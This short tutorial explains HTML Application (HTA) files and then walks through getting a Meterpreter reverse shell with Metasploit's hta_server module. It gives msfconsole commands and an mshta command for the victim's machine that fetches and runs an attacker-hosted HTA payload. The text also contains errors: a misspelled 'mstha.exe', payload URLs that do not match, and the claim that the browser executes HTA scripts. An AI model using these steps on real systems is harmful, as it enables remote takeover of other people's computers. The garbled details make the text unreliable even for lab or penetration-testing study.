An HTML Application (HTA) server is a web server that hosts HTA files. HTAs are HTML files that can run scripts, such as VBScript or JScript. This means that
HTA servers can be used to deliver malicious code to users.
HTA servers work by hosting HTA files that are designed to exploit vulnerabilities in web browsers. When a user opens an HTA file, the browser executes the 
scripts contained in the file. These scripts can then perform a variety of malicious actions, such as:

Stealing passwords
Installing malware
Taking control of the user's computer

Running the hta_server module to gain the meterpreter shell. Start msfconsole.
Commands:
-msfconsole -q
-use exploit/windows/misc/hta_server
-exploit

Copy the generated payload i.e “http://10.10.0.2:8080/6Nz7aySfPN.hta” and run it on cmd.exe
with mshta command to gain the meterpreter shell. We will run this command on the victims machine to gain the meterpreter shell. 
-mstha.exe http://10.10.24.3:8080/3aAgf38w.hta
Mshta.exe is a Windows executable file that is part of the Microsoft HTML Application (HTA) runtime.
This will create a meterpreter shell
